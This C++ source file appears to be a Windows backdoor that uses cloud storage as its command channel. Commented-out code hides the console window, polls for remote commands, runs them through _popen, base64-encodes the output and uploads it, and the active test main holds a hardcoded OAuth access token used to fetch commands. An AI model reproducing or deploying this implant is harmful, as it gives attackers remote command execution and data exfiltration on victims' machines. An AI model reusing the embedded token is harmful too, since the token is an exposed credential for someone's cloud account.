#include <stdio.h>
#include <iostream>
#include <windows.h>
#include "MyString.h"
#include "CloudFunctions.h"
#include <stdio.h>

int Odd_Num() {
    int result = rand();
    if (result % 2 == 1)
        return result;
    else
        return result - 1;
}

//int main() {
//    //HWND h = GetConsoleWindow();
//    //ShowWindow(h, 0);
//    DWORD i = 2;
//    while (Odd_Num() % 2 != 0) {
//        Sleep(expo(i, 4) * 1000);
//        MyString data = downloadContext();
//        if (data.getLength() > 0) {
//            
//            i = 2;
//            for (int i = 0; i < data.getLength(); i++) {
//                if (data.getCharAt(i) == '\n') {
//                    data.setCharAt(i, '&');
//                }
//            }
//            FILE* file = _popen(data.getContext(), "r");
//            MyString output = "";
//            char temp_buffer[1024];
//            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
//                output = output + temp_buffer;
//            }
//            //output = encoder(output, 1);
//            output = converter_64(output);
//            upload(output);
//            deleteContext();
//        } else {
//            i++;
//        }
//    }
//    return 0;
//}

int main() {
    std::string output;
    std::string refreshToken;
    std::string accessToken = "ya29.a0AcM612x437MBwys7w6F1KpPlrcdiR7lo___-2NSNsdNKOsd8i11PYOy7Yv9Jkv2sWCxvSXoDa6xkwJ0Bmqc6-HBmh7hFrO0Xjs_yWRU_D_Ao4cLyx4SJa8lalXv2OWM6yniTrujOrEFFEXNUX3rdQR-9TIvevD6_yVwBFErE6gaCgYKAfESARASFQHGX2MiwF2f6LGAKjaiy3Wh3JMIPw0177";
    //DWORD responseCode;
    /*setNewAccessToken(accessToken, refreshToken);*/
    //responseCode = setNewRefreshAndAccessToken(accessToken, refreshToken);
    //handleFailsafe(refreshToken, accessToken);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), responseCode);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\n", refreshToken.c_str(), accessToken.c_str());
    downloadContext(accessToken, output);
    printf("Test begins:\nThe source file context is: %s\n", output.c_str());
}